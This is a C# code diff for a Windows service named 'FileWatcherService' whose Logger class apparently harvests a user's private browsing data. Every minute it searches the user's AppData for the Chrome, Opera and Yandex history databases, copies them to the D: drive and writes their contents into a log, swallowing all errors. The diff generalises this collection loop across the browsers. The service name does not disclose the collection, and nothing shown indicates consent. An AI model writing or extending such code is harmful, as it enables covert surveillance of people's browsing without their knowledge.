@@ -99,6 +99,7 @@ namespace FileWatcherService
     class Logger
     {
         #region свойства службы
+        Dictionary<string, string> brawsers;
         const int port = 8888;
         const string address = "127.0.0.1";
         public string UserName { get; set; }
@@ -118,6 +119,8 @@ namespace FileWatcherService
             }
             catch (Exception ex) { }
             UserName = name;
+            brawsers = new Dictionary<string, string>();
+            SearchBrowsers();
         }
         public void Start()
         {
@@ -126,63 +129,84 @@ namespace FileWatcherService
                 try
                 {
                     Thread.Sleep(60000);
-
-                    CopyBrowserHistory("Yandex", @"Local\Yandex\YandexBrowser\User Data\Default\");
-                    RecordEntry(("-------------------------------------------Yandex"));
-                    RecordEntry(ReadBrowserHistory("Yandex"));
-                    CopyBrowserHistory("Opera", @"Roaming\Opera Software\Opera Stable\");
-                    RecordEntry(("-------------------------------------------Опера"));
-                    RecordEntry(ReadBrowserHistory("Opera"));
-                    CopyBrowserHistory("Google", @"Local\Google\Chrome\User Data\Default\");
-                    RecordEntry(("-------------------------------------------Массоны"));
-                    RecordEntry(ReadBrowserHistory("Google"));
+                    foreach (var item in brawsers)
+                    {
+                        CopyBrowserHistory(item.Key, item.Value);
+                        RecordEntry(($"-------------------------------------------{item.Key}"));
+                        RecordEntry(ReadBrowserHistory(item.Key));
+                    }
                     GC.Collect();
+
                 }
                 catch (Exception d)
                 {
                     RecordEntry(d.Message);
                     RecordEntry(d.Source);
                 }
-
-
-
-
-
-
             }
         }
-
         public void Stop()
         {
 
             enabled = false;
         }
-#endregion
+
+        private void SearchBrowsers()
+        {
+            try
+            {
+                string[] files = Directory.GetFiles($@"C:\Users\{UserName}\AppData\Local\Google\Chrome\User Data\Default\");
+                foreach (var f in files)
+                {
+
+                    if (Path.GetFileName(f.ToLower()).ToString().Equals("history"))
+                    {
+                        brawsers.Add("Google", Path.GetFullPath(f));
+
+                    }
+                }
+
+                files = Directory.GetFiles($@"C:\Users\{UserName}\AppData\Roaming\Opera Software\Opera Stable\");
+                foreach (var f in files)
+                {
+
+                    if (Path.GetFileName(f.ToLower()).ToString().Equals("history"))
+                    {
+                        brawsers.Add("Opera", Path.GetFullPath(f));
+
+                    }
+                }
+
+                files = Directory.GetFiles($@"C:\Users\{UserName}\AppData\Local\Yandex\YandexBrowser\User Data\Default\");
+                foreach (var f in files)
+                {
+
+                    if (Path.GetFileName(f.ToLower()).ToString().Equals("history"))
+                    {
+                        brawsers.Add("Yandex", Path.GetFullPath(f));
+
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+
+            }
+        }
+
+        #endregion
         #region копирование истории браузеров
         private void CopyBrowserHistory(string brawseName, string brawserPath)
         {
             try
             {
 
-                string google = $@"C:\Users\{UserName}\AppData\{brawserPath}";
-
-                string[] files = Directory.GetFiles($@"C:\Users\{UserName}\AppData\{brawserPath}");
-                foreach (var f in files)
-                {
-
-                    if (Path.GetFileName(f.ToLower()).ToString().Equals("history"))
-                    {
-                        google = Path.GetFullPath(f);
-
-                    }
-                }
-
                 if (File.Exists($"D:\\history{brawseName}.db"))
                 {
                     File.Delete($"D:\\history{brawseName}.db");
                 }
 
-                using (FileStream ms = new FileStream(google, FileMode.Open, FileAccess.ReadWrite, FileShare.Read))
+                using (FileStream ms = new FileStream(brawserPath, FileMode.Open, FileAccess.ReadWrite, FileShare.Read))
                 {
                     ms.Seek(0, SeekOrigin.Begin);
                     byte[] buffer = new byte[ms.Length];
@@ -196,8 +220,7 @@ namespace FileWatcherService
                     ms.Close();
                     ms.Dispose();
                 }
-                google = $@"C:\Users\{UserName}\AppData\Local\{brawserPath}";
-
+               
             }
             catch (Exception ex)
             {
